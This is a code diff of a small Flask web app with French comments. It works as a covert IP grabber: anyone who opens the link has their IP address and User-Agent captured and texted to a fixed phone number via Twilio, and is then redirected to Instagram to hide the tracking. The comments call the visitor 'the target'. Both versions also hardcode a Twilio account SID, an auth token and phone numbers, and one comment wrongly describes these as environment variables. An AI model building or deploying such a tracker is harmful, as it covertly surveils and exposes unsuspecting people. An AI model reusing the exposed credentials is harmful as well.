@@ -1,38 +1,44 @@
+import os
 from flask import Flask, request, redirect
-import requests
+from twilio.rest import Client
 
+# Initialisation de Flask
 app = Flask(__name__)
 
-# Tes infos Twilio
+# Variables d'environnement pour Twilio
 TWILIO_ACCOUNT_SID = "AC2ef2bd5bd5146f76f586d2c577159f90"
 TWILIO_AUTH_TOKEN = "ec746c04233667b9836c82d9512a9ee9"
 FROM_PHONE = "+12524866318"
 TO_PHONE = "+33635960569"
 
-@app.route('/')
+# Création du client Twilio
+client = Client(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN)
+
+# Fonction pour envoyer le SMS
+def send_sms(ip, user_agent):
+    message = f"Nouvelle connexion:\nIP: {ip}\nUser-Agent: {user_agent}"
+    client.messages.create(
+        body=message,
+        from_=FROM_PHONE,
+        to=TO_PHONE
+    )
+
+# Route principale
+@app.route("/")
 def index():
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    ua = request.headers.get('User-Agent')
-    
-    message = f"[IP TRACKED]\nIP: {ip}\nUA: {ua}"
-    
-    print(message)
-    
-    # Envoi SMS
-    try:
-        requests.post(
-            f"https://api.twilio.com/2010-04-01/Accounts/{TWILIO_ACCOUNT_SID}/Messages.json",
-            auth=(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN),
-            data={
-                "From": FROM_PHONE,
-                "To": TO_PHONE,
-                "Body": message
-            }
-        )
-    except Exception as e:
-        print("Erreur d'envoi SMS:", e)
+    # Récupérer l'IP et User-Agent de la cible
+    ip_address = request.remote_addr
+    user_agent = request.headers.get('User-Agent')
 
-    return redirect("https://instagram.com")
+    # Envoyer l'IP et l'user-agent par SMS
+    send_sms(ip_address, user_agent)
 
-if __name__ == '__main__':
-    app.run(host="0.0.0.0", port=10000)
+    # URL de redirection vers Instagram (tu peux la changer par l'URL de ton choix)
+    redirect_url = "https://www.instagram.com"
+
+    # Rediriger la cible
+    return redirect(redirect_url)
+
+# Lancer le serveur
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=5000)
